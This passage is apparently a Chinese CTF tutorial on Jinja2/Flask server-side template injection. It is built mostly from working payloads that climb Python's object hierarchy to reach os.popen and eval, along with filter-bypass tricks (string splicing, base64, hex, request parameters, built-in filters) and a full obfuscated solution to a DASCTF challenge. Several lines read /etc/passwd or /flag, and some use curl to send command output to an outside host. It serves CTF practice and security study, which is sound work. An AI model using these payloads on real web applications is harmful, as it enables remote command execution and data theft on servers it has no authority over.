这样我们在进行SSTI注入的时候就可以通过这种方式使用很多的类和方法，通过子类再去获取子类的子类、更多的方法，找出可以利用的类和方法加以利用。总之，是通过python的对象的继承来一步步实现文件读取和命令执行的：</code></pre>
<pre><code class="hljs plaintext">''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()')

''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__("os").popen("ls").read()')

这两个payload用的是同一个模块,__builtins__模块,eval方法.

[].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].popen('ls').read()</code></pre>
<h4 id="绕过">绕过</h4>
<p><strong>拼接</strong></p>
<pre><code class="hljs plaintext">object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')

().__class__.__bases__[0].__subclasses__()[40]('r','fla'+'g.txt')).read()</code></pre>
<p><strong>编码</strong></p>
<pre><code class="hljs plaintext">
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').popen('ls').read()")

等价于

().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['ZXZhbA=='.decode('base64')]("X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=".decode('base64'))(可以看出单双引号内的都可以编码)

同理还可以进行rot13、16进制编码等</code></pre>
<p><strong>过滤中括号[]</strong></p>
<pre><code class="hljs plaintext">getitem()

"".__class__.__mro__[2]
"".__class__.__mro__.__getitem__(2)

pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。

''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)
('/etc/passwd').read()
若.也被过滤，使用原生JinJa2函数|attr()
将request.__class__改成request|attr("__class__")

字典读取

__builtins__['eval']()
__builtins__.eval()

经过测试这种方法在python解释器里不能执行，但是在测试的题目环境下可以执行</code></pre>
<h4 id="过滤双下划线__">过滤双下划线__</h4>
<pre><code class="hljs plaintext">{{
''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read()
}}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__

将其中的 request.args 改为 request.values 则利用post的方式进行传参

GET:
{{ ''[request.value.class][request.value.mro][2][request.value.subclasses]()[40]
('/etc/passwd').read() }}

POST:
class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code></pre>
<h4 id="过滤花括号">过滤花括号</h4>
<pre><code class="hljs plaintext">{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`whoami`').read()=='p' %}1{% endif %}
或者：	
{% if ''.__class__.__mro__[2].__subclasses__()
[59].__init__.func_globals.linecache.os.popen('curl
http://http.bin.buuoj.cn/1inhq4f1 -d `ls / | grep flag`;') %}1{% endif %}
如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来
{% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p'
%}1{% endif %}</code></pre>
<h4 id="过滤引号">过滤引号</h4>
<p>request.args 是flask中的一个属性,为返回请求的参数,这里把 path 当作变量名,将后面的路径传值进来,进而绕过了引号的过滤</p>
<pre><code class="hljs plaintext">{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)
(request.args.path).read()}}&amp;path=/etc/passw</code></pre>
<h4 id="过滤了单双引号和中括号">过滤了单双引号和中括号</h4>
<p>request.cookies仍然可以用<br>
单双引号的绕过还是利用之前提到的姿势，至于中括号的绕过拿点绕过，拿 <strong>getitem</strong> 等绕过都可<br>
以。<br>
使用request绕过的话可以这样：</p>
<pre><code class="hljs plaintext">?name={{url_for.__globals__.os.popen(request.cookies.c).read()}}
Cookie:c=cat /flag</code></pre>
<h4 id="过滤关键字">过滤关键字</h4>
<p>base64编码绕过<br>
<strong>getattribute</strong> 使用实例访问属性时,调用该方法<br>
例如被过滤掉 <strong>class</strong> 关键词</p>
<pre><code class="hljs plaintext">{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()
[40]("/etc/passwd").read()}}</code></pre>
<h4 id="字符串拼接绕过">字符串拼接绕过</h4>
<pre><code class="hljs plaintext">{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]
("/etc/passwd").read()}}</code></pre>
<h4 id="过滤-_">过滤 _</h4>
<pre><code class="hljs plaintext">利用request.args属性
{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]
('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
将其中的request.args改为request.values则利用post的方式进行传参</code></pre>
<h4 id="过滤os">过滤os</h4>
<pre><code class="hljs plaintext">?name=
{{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).
read()}}&amp;a=__globals__&amp;b=os&amp;c=cat /flag</code></pre>
<h4 id="过滤args">过滤args</h4>
<pre><code class="hljs plaintext">?name={{url_for.__globals__[request.cookies.a][request.cookies.b]
(request.cookies.c).read()}}
cookie：a=os;b=popen;c=cat /flag

{{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}
cookie:a=__globals__;b=cat /flag</code></pre>
<h4 id="引号内十六进制绕过">引号内十六进制绕过</h4>
<pre><code class="hljs plaintext">{{"".__class__}}
{{""["\x5f\x5fclass\x5f\x5f"

_`是`\x5f`，`.`是`\x2E</code></pre>
<h4 id="chr等被过滤无法引入字符串">" ’ chr等被过滤，无法引入字符串</h4>
<ul>
<li>直接拼接键名</li>
</ul>
<pre><code class="hljs plaintext">dict(buil=aa,tins=dd)|join()</code></pre>
<ul>
<li>利用 string 、 pop 、 list 、 slice 、 first 等过滤器从已有变量里面直接找</li>
</ul>
<pre><code class="hljs plaintext">(app.__doc__|list()).pop(102)|string()</code></pre>
<ul>
<li>构造出 % 和 c 后，用格式化字符串代替 <strong>chr</strong></li>
</ul>
<pre><code class="hljs plaintext">{%set udl=dict(a=pc,c=c).values()|join %}     # uld=%c
{%set i1=dict(a=i1,c=udl%(99)).values()|join %}</code></pre>
<h4 id="过滤数字">过滤数字</h4>
<p>例如web370<br>
就想办法构造出数字</p>
<pre><code class="hljs plaintext">?name=
{% set c=(dict(e=a)|join|count)%}
{% set cc=(dict(ee=a)|join|count)%}
{% set ccc=(dict(eee=a)|join|count)%}
{% set cccc=(dict(eeee=a)|join|count)%}
{% set ccccccc=(dict(eeeeeee=a)|join|count)%}
{% set cccccccc=(dict(eeeeeeee=a)|join|count)%}
{% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%}
{% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%}
{% set coun=(cc~cccc)|int%}
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(coun)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set
file=chr((cccc~ccccccc)|int)%2bchr((cccccccccc~cc)|int)%2bchr((cccccccccc~cccccc
cc)|int)%2bchr((ccccccccc~ccccccc)|int)%2bchr((cccccccccc~ccc)|int)%}
{%print(x.open(file).read())%}</code></pre>
<h4 id="使用-jinja2-过滤器绕过">使用 Jinja2 过滤器绕过</h4>
<p>在 JinJa2 中内置了很多过滤器，变量可以通过过滤器进行修改，过滤器与变量之间用管道符号<code>|</code>隔开，括号中可以有可选参数，也可以没有参数，过滤器函数可以带括号也可以不带括号。可以使用管道符号<code>|</code>连接多个过滤器，一个过滤器的输出应用于下一个过滤器。<br>
内置过滤器列表如下：</p>
<table>
<thead>
<tr>
<th>abs()</th>
<th>forceescape()</th>
<th>map()</th>
<th>select()</th>
<th>unique()</th>
</tr>
</thead>
<tbody>
<tr>
<td>attr()</td>
<td>format()</td>
<td>max()</td>
<td>selectattr()</td>
<td>upper()</td>
</tr>
<tr>
<td>batch()</td>
<td>groupby()</td>
<td>min()</td>
<td>slice()</td>
<td>urlencode()</td>
</tr>
<tr>
<td>capitalize()</td>
<td>indent()</td>
<td>pprint()</td>
<td>sort()</td>
<td>urlize()</td>
</tr>
<tr>
<td>center()</td>
<td>int()</td>
<td>random()</td>
<td>string()</td>
<td>wordcount()</td>
</tr>
<tr>
<td>default()</td>
<td>items()</td>
<td>reject()</td>
<td>striptags()</td>
<td>wordwrap()</td>
</tr>
<tr>
<td>dictsort()</td>
<td>join()</td>
<td>rejectattr()</td>
<td>sum()</td>
<td>xmlattr()</td>
</tr>
<tr>
<td>escape()</td>
<td>last()</td>
<td>replace()</td>
<td>title()</td>
<td>filesizeformat()</td>
</tr>
<tr>
<td>length()</td>
<td>reverse()</td>
<td>tojson()</td>
<td>first()</td>
<td>list()</td>
</tr>
<tr>
<td>round()</td>
<td>trim()</td>
<td>float()</td>
<td>lower()</td>
<td>safe()</td>
</tr>
<tr>
<td>truncate()</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>其中常见过滤器用法如下：</p>
<blockquote>
<p>abs()<br>
  返回参数的绝对值。<br>
attr()<br>
  获取对象的属性。foo|attr(“bar”) 等价于 foo.bar<br>
capitalize()<br>
  第一个字符大写，所有其他字符小写。<br>
first()<br>
  返回序列的第一项。<br>
float()<br>
  将值转换为浮点数。如果转换不起作用将返回 0.0。<br>
int()<br>
  将值转换为整数。如果转换不起作用将返回 0。<br>
items()<br>
  返回一个迭代器(key, value)映射项。</p>
</blockquote>
<p>其他用法详见官方文档：</p>
<p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/latest/templates/#list-of-builtin-filters">Template Designer Documentation - Jinja Documentation (3.2.x)</a></p>
<p>使用过滤器构造Payload，一般思路是利用这些过滤器，逐步拼接出需要的字符、数字或字符串。对于一般原始字符的获取方法有以下几种：</p>
<pre><code class="hljs python">{% <span class="hljs-built_in">set</span> org = ({ }|select()|string()) %}{{org}}
<span class="hljs-comment"># &lt;generator object select_or_reject at 0x0000020B2CA4EA20&gt;</span>
{% <span class="hljs-built_in">set</span> org = (self|string()) %}{{org}}
<span class="hljs-comment"># &lt;TemplateReference None&gt;</span>
{% <span class="hljs-built_in">set</span> org = self|string|urlencode %}{{org}}
<span class="hljs-comment"># %3CTemplateReference%20None%3E</span>
{% <span class="hljs-built_in">set</span> org = (app.__doc__|string) %}{{org}}
<span class="hljs-comment"># Hello The default undefined type.  This undefined type can be printed and</span>
<span class="hljs-comment">#    iterated over, but every other access will raise an :exc:`UndefinedError`:</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#     &gt;&gt;&gt; foo = Undefined(name='foo')</span>
<span class="hljs-comment">#     &gt;&gt;&gt; str(foo)</span>
<span class="hljs-comment">#     ''</span>
<span class="hljs-comment">#     &gt;&gt;&gt; not foo</span>
<span class="hljs-comment">#     True</span>
<span class="hljs-comment">#     &gt;&gt;&gt; foo + 42</span>
<span class="hljs-comment">#     Traceback (most recent call last):</span>
<span class="hljs-comment">#       ...</span>
<span class="hljs-comment">#     jinja2.exceptions.UndefinedError: 'foo' is undefined</span>
{% <span class="hljs-built_in">set</span> num = (self|<span class="hljs-built_in">int</span>) %}{{num}}
<span class="hljs-comment"># 0</span>
{% <span class="hljs-built_in">set</span> num = (self|string|length) %}{{num}}
<span class="hljs-comment"># 24</span>
{% <span class="hljs-built_in">set</span> point = self|<span class="hljs-built_in">float</span>|string|<span class="hljs-built_in">min</span> %}{{point}}
<span class="hljs-comment"># .</span></code></pre>
<p>通过以上几种Payload，返回的字符串中包含尖括号、字母、空格、下划线、数字、空格、百分号、点号。<br>
我们的目标就是使用这些返回的字符串，结合各种过滤器，拼接出最终的Payload。</p>
<p><strong>GPT代码解释</strong></p>
<pre><code class="hljs plaintext">这段代码是使用Jinja2模板语言的语法。让我逐步解释它的含义：

1. `{% set org = ... %}`: 这是Jinja2的赋值语句。它创建了一个名为"org"的变量，并将其赋值为接下来表达式的结果。

2. `({ }|select()|string())`: 这是一个表达式，由几个操作符组成。

   - `{ }`：这是一个空的字典对象。
   - `select()`：这是Jinja2的过滤器(filter)函数之一。`select()`函数用于选择字典中的项，但在这个例子中，字典是空的，所以它实际上没有进行任何选择。
   - `string()`：这是Jinja2的过滤器函数之一。`string()`函数将其输入转换为字符串类型。

3. `{{org}}`: 这是Jinja2的输出表达式。它会在模板中显示变量"org"的值。

综上所述，这段代码的作用是创建一个名为"org"的变量，并将其赋值为空字典经过选择和字符串转换后的结果。然后，它将"org"的值输出到模板中。由于选择和字符串转换操作并未改变空字典的内容，因此最终输出的结果将是一个空字符串。</code></pre>
<p><strong>实战演示</strong></p>
<p><strong>[2020 DASCTF 八月安恒月赛]ezflask</strong></p>
<p>题目源码：</p>
<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, render_template_string, redirect, request, session, abort, send_from_directory
app = Flask(__name__)


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">"/"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_jinja</span>(<span class="hljs-params">s</span>):
        blacklist = [<span class="hljs-string">'class'</span>, <span class="hljs-string">'attr'</span>, <span class="hljs-string">'mro'</span>, <span class="hljs-string">'base'</span>,
                     <span class="hljs-string">'request'</span>, <span class="hljs-string">'session'</span>, <span class="hljs-string">'+'</span>, <span class="hljs-string">'add'</span>, <span class="hljs-string">'chr'</span>, <span class="hljs-string">'ord'</span>, <span class="hljs-string">'redirect'</span>, <span class="hljs-string">'url_for'</span>, <span class="hljs-string">'config'</span>, <span class="hljs-string">'builtins'</span>, <span class="hljs-string">'get_flashed_messages'</span>, <span class="hljs-string">'get'</span>, <span class="hljs-string">'subclasses'</span>, <span class="hljs-string">'form'</span>, <span class="hljs-string">'cookies'</span>, <span class="hljs-string">'headers'</span>, <span class="hljs-string">'['</span>, <span class="hljs-string">']'</span>, <span class="hljs-string">'\''</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'{}'</span>]
        flag = <span class="hljs-literal">True</span>
        <span class="hljs-keyword">for</span> no <span class="hljs-keyword">in</span> blacklist:
            <span class="hljs-keyword">if</span> no.lower() <span class="hljs-keyword">in</span> s.lower():
                flag = <span class="hljs-literal">False</span>
                <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">return</span> flag
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> request.args.get(<span class="hljs-string">'name'</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()
    <span class="hljs-keyword">elif</span> safe_jinja(request.args.get(<span class="hljs-string">'name'</span>)):
        name = request.args.get(<span class="hljs-string">'name'</span>)
    <span class="hljs-keyword">else</span>:
        name = <span class="hljs-string">'wendell'</span>
    template = <span class="hljs-string">'''</span>
<span class="hljs-string"></span>
<span class="hljs-string">    &lt;div class="center-content"&gt;</span>
<span class="hljs-string">        &lt;p&gt;Hello, %s&lt;/p&gt;</span>
<span class="hljs-string">    &lt;/div&gt;</span>
<span class="hljs-string">    &lt;!--flag in /flag--&gt;</span>
<span class="hljs-string">    &lt;!--python3.8--&gt;</span>
<span class="hljs-string">'''</span> % (name)
    <span class="hljs-keyword">return</span> render_template_string(template)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    app.run(host=<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">5000</span>)</code></pre>
<p>可以看到题目过滤的死死地，最关键是把attr也给过滤了的话，这就很麻烦了，但是我们还可以用过滤器进行绕过。</p>
<p>在存在ssti的地方执行如下payload：</p>
<pre><code class="hljs plaintext">{% set org = ({ }|select()|string()) %}{{org}}
# 或 {% set org = ({ }|select|string) %}{{org}}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622174910753.png" alt="image-20230622174910753"></p>
<p>可以看到，我们得到了一段字符串：<code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code>，这段字符串中不仅存在字符，还存在空格、下划线，尖号和数字。也就是说，如果题目过滤了这些字符的话，我们便可以在 <code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code> 这个字符串中取到我们想要的字符，从而绕过过滤。</p>
<p>然后我们在使用list()过滤器将字符串转化为列表：</p>
<pre><code class="hljs plaintext">{% set orglst = ({ }|select|string|list) %}{{orglst}}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622174919961.png" alt="image-20230622174919961"></p>
<p>如上图所示，反回了一个列表，列表中是 <code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code> 这个字符串的每一个字符。接下来我们便可以使用使用pop()等方法将列表里的字符取出来了。如下所示，我们取一个下划线 <code>_</code>：</p>
<pre><code class="hljs plaintext">{% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}}    # _</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622174927675.png" alt="image-20230622174927675"></p>
<p>同理还能取到更多的字符：</p>
<pre><code class="hljs plaintext">{% set space = (({ }|select|string|list).pop(10)|string) %}{{spa}}    # 空格
{% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}}    # _
{% set zero = (({ }|select|string|list).pop(38)|int) %}{{zero}}    # 0
{% set seven = (({ }|select|string|list).pop(40)|int) %}{{seven}}    # 7
......</code></pre>
<p>这里，其实有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算，如下示例：</p>
<pre><code class="hljs plaintext">{% set zero = (({ }|select|string|list).pop(38)|int) %}    # 0
{% set one = (zero**zero)|int %}{{one}}    # 1
{%set two = (zero-one-one)|abs %}    # 2
{%set three = (zero-one-one-one)|abs %}    # 3
{% set five = (two*two*two)-one-one-one %}    # 5
#  {%set four = (one+three) %}    注意, 这样的加号的是不行的,不知道为什么,只能用减号配合abs取绝对值了
......</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622174941520.png" alt="image-20230622174941520"></p>
<p>通过上述原理，我们可以依次获得构造payload所需的特殊字符与字符串：</p>
<pre><code class="hljs plaintext"># 首先构造出所需的数字:
{% set zero = (({ }|select|string|list).pop(38)|int) %}    # 0
{% set one = (zero**zero)|int %}    # 1
{% set two = (zero-one-one)|abs %}    # 2
{% set four = (two*two)|int %}    # 4
{% set five = (two*two*two)-one-one-one %}    # 5
{% set seven = (zero-one-one-five)|abs %}    # 7

# 构造出所需的各种字符与字符串:
{% set xhx = (({ }|select|string|list).pop(24)|string) %}    # _
{% set space = (({ }|select|string|list).pop(10)|string) %}    # 空格
{% set point = ((app.__doc__|string|list).pop(26)|string) %}    # .
{% set yin = ((app.__doc__|string|list).pop(195)|string) %}    # 单引号 '
{% set left = ((app.__doc__|string|list).pop(189)|string) %}    # 左括号 (
{% set right = ((app.__doc__|string|list).pop(200)|string) %}    # 右括号 )

{% set c = dict(c=aa)|reverse|first %}    # 字符 c
{% set bfh = self|string|urlencode|first %}    # 百分号 %
{% set bfhc=bfh~c %}    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接
{% set slas = bfhc%((four~seven)|int) %}    # 使用%c构造斜杠 /
{% set but = dict(buil=aa,tins=dd)|join %}    # builtins
{% set imp = dict(imp=aa,ort=dd)|join %}    # import
{% set pon = dict(po=aa,pen=dd)|join %}    # popen
{% set os = dict(o=aa,s=dd)|join %}    # os
{% set ca = dict(ca=aa,t=dd)|join %}    # cat
{% set flg = dict(fl=aa,ag=dd)|join %}    # flag
{% set ev = dict(ev=aa,al=dd)|join %}    # eval
{% set red = dict(re=aa,ad=dd)|join %}    # read
{% set bul = xhx*2~but~xhx*2 %}    # __builtins__</code></pre>
<p>将上面构造的字符或字符串拼接起来构造出 <code>__import__('os').popen('cat /flag').read()</code>：</p>
<pre><code class="hljs plaintext">{% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622174953687.png" alt="image-20230622174953687"></p>
<p>如上图所示，成功构造出了 <code>__import__('os').popen('cat /flag').read()</code> 。</p>
<p>然后将上面构造的各种变量添加到SSTI万能payload里面就行了：</p>
<pre><code class="hljs plaintext">{% for f,v in whoami.__init__.__globals__.items() %}    # globals
    {% if f == bul %} 
        {% for a,b in v.items() %}    # builtins
            {% if a == ev %}    # eval
                {{b(pld)}}    # eval("__import__('os').popen('cat /flag').read()")
            {% endif %}
        {% endfor %}
    {% endif %}
{% endfor %}</code></pre>
<p>所以最终的payload为：</p>
<pre><code class="hljs plaintext">{% set zero = (({ }|select|string|list).pop(38)|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs|int %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set seven = (zero-one-one-five)|abs %}{% set xhx = (({ }|select|string|list).pop(24)|string) %}{% set space = (({ }|select|string|list).pop(10)|string) %}{% set point = ((app.__doc__|string|list).pop(26)|string) %}{% set yin = ((app.__doc__|string|list).pop(195)|string) %}{% set left = ((app.__doc__|string|list).pop(189)|string) %}{% set right = ((app.__doc__|string|list).pop(200)|string) %}{% set c = dict(c=aa)|reverse|first %}{% set bfh=self|string|urlencode|first %}{% set bfhc=bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set os = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx*2~but~xhx*2 %}{% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}{% for f,v in whoami.__init__.__globals__.items() %}{% if f == bul %}{% for a,b in v.items() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622175015233.png" alt="image-20230622175015233"></p>
<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9584">https://xz.aliyun.com/t/9584</a></p>
<h3 id="26-一些姿势">2.6 一些姿势</h3>
<h4 id="1-config">1. config</h4>
<pre><code class="hljs scss">{{config}} 可以获取当前设置，如果题目类似 app<span class="hljs-selector-class">.config</span> <span class="hljs-selector-attr">[<span class="hljs-string">'FLAG'</span>]</span> =
os<span class="hljs-selector-class">.environ</span><span class="hljs-selector-class">.pop</span>（'FLAG'） ，那可以直接访问 {{config<span class="hljs-selector-attr">[<span class="hljs-string">'FLAG'</span>]</span>}} 或者 {{config<span class="hljs-selector-class">.FLAG</span>}} 得到flag</code></pre>
<h4 id="2-self">2. self</h4>
<pre><code class="hljs scss">{{self}} ⇒ &lt;TemplateReference <span class="hljs-attribute">None</span>&gt;
{{self<span class="hljs-selector-class">.__dict__</span><span class="hljs-selector-class">._TemplateReference__context</span><span class="hljs-selector-class">.config</span>}} ⇒ 同样可以找到config</code></pre>
<h4 id="3-等数据结构">3.  “” 、 [] 、 () 等数据结构</h4>
<pre><code class="hljs scss">主要目的是配合 __class__<span class="hljs-selector-class">.__mro__</span><span class="hljs-selector-attr">[2]</span> 这样找到 <span class="hljs-selector-tag">object</span> 类
{{<span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__base__</span><span class="hljs-selector-class">.__subclasses__</span>()
<span class="hljs-selector-attr">[68]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'os'</span>]</span><span class="hljs-selector-class">.__dict__</span><span class="hljs-selector-class">.environ</span><span class="hljs-selector-attr">[<span class="hljs-string">'FLAG'</span>]</span></code></pre>
<h4 id="4-url_for-g-request-namespace-lipsum-range-session-dictget_flashed_messages-cycler-joiner-config等">4、url_for, g, request, namespace, lipsum, range, session, dict,get_flashed_messages, cycler, joiner, config等</h4>
<p>如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app<br>
等）。<br>
例如：</p>
<pre><code class="hljs scss">{{url_for<span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'current_app'</span>]</span><span class="hljs-selector-class">.config</span><span class="hljs-selector-class">.FLAG</span>}}
{{get_flashed_messages<span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'current_app'</span>]</span><span class="hljs-selector-class">.config</span><span class="hljs-selector-class">.FLAG</span>}}
{{request<span class="hljs-selector-class">.application</span><span class="hljs-selector-class">.__self__</span><span class="hljs-selector-class">._get_data_for_json</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'json'</span>]</span><span class="hljs-selector-class">.JSONEncode</span>
r<span class="hljs-selector-class">.default</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'current_app'</span>]</span><span class="hljs-selector-class">.config</span><span class="hljs-selector-attr">[<span class="hljs-string">'FLAG'</span>]</span>}}</code></pre>
<h4 id="5-在url执行py命令格式">5. 在URL执行py命令格式</h4>
<pre><code class="hljs scss">{%这是内容%}
eg:
{% for c in <span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__base__</span><span class="hljs-selector-class">.__subclasses__</span>() %}
{% if c<span class="hljs-selector-class">.__name__</span>=='file' %}
{{ <span class="hljs-built_in">c</span>("/etc/passwd")<span class="hljs-selector-class">.readlines</span>() }}
{% endif %}
{% endfor %}</code></pre>
<h3 id="27-常用到的payload">2.7 常用到的payload</h3>
<pre><code class="hljs scss">name={{()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__mro__</span><span class="hljs-selector-attr">[-1]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[132]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'popen'</span>]</span>('cat /flag')<span class="hljs-selector-class">.read</span>()}}   <span class="hljs-comment">//132是os模块</span>

name={{ config<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'os'</span>]</span><span class="hljs-selector-class">.popen</span>('cat ../flag')<span class="hljs-selector-class">.read</span>() }}   <span class="hljs-comment">//大佬经常用的config直接出</span>
在导入不了具体哪个子类例如<span class="hljs-number">132</span>的时候，可以用__bulit__重新导入Os模块然后进行命令执行

name={{x<span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'__builtins__'</span>]</span><span class="hljs-selector-class">.eval</span>('__import__("os")<span class="hljs-selector-class">.popen</span>("cat /flag")<span class="hljs-selector-class">.read</span>()')}}
当然如果遇到过了了敏感字符，记得自己去拼接一下</code></pre>
<p>注入顺序：先找到一个类型所属的对象–&gt;在找到这个对象所继承的基类–&gt;他的功能是谁传授给他的(‘找到他父亲’)–&gt;他父亲除了有这个子类，还有其他的子类呗，这里的类，就包括很多的方法了，比如我们最需要用到的就是，OS模块来命令执行–&gt;找到OS类了，将这个类初始化成方法，相当于我们调用了OS模块–&gt;通过globals保存对全局变量的引用，然后再用OS模块进行命令执行</p>
<h4 id="ssti常用的语句格式">SSTI常用的语句格式</h4>
<pre><code class="hljs plaintext">{{5*5}} 直接执行
{% set a="test" %}{{a}}      //设置变量
{% for i in ['t ','e ','s ','t '] %}{{i}}{%endfor%}  //执行循环  --&gt;别忘了中间那个{{i}}
{% if 25==5*5 %}{{"success"}}{% endif %}  //条件执行</code></pre>
<h4 id="绕过ssti过滤">绕过SSTI过滤</h4>
<p>再读了一部分的文章，再结合自己的做题情况来看，对SSTI考点总结如下：</p>
<pre><code class="hljs plaintext">1.过滤一些字符–&gt;绕过即可
2.寻找模块进行命令执行
主要是对第一个过滤的考察，比如说：对字符串进行拼接绕过，编码绕过，format、char等绕过拼接，通过getattribute等函数替代符号的效果,通过request的方法进行传参，通过%set的方法
我们知道在SSTI中用到的符号无非就是： .   __   ()   []   ‘’   五种</code></pre>
